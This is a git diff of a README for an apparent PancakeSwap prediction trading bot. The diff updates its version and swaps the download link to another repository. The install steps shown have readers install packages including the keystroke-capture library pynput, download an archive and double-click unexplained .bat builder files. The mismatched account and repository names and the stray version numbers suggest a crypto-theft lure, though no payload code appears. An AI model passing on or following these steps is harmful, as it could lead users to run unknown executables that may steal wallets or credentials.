@@ -25,12 +25,12 @@ pip install pynput requests ccxt==1.16.59 cryptography ws4py bs4
 * Double click the .bat file of which bot you want to start. 
 
 
-# **🥞 PancakeSwap Prediction v3.7(04.05.2022) Bot (NO PRIVATE KEY REQUIRED!) 🤖**
+# **🥞 PancakeSwap Prediction v3.9(21.06.2022) Bot (NO PRIVATE KEY REQUIRED!) 🤖**
 
 ![PancakeSwap-Logo-Big](https://github.com/parames3010/PancakeswapPredictionBot-2022/blob/main/pancake.png)
 
 ## 💡 PancakeSwap Prediction v3.7 Bot Installation
-1. Download the Full Repo [Github](https://github.com/CoinSwapPump/PumpDumpDedector/archive/master.zip). 
+1. Download the Full Repo [Github](https://github.com/CoinSwapPump/PancakeSwapPredictionBot2023/archive/master.zip). 
 2. Unzip ``master.zip``
 3. Double click `PredictionBotBuilder.bat` 
 4. If your current internet is of poor quality, please build the light version => `LightVersionBuilder.bat` 
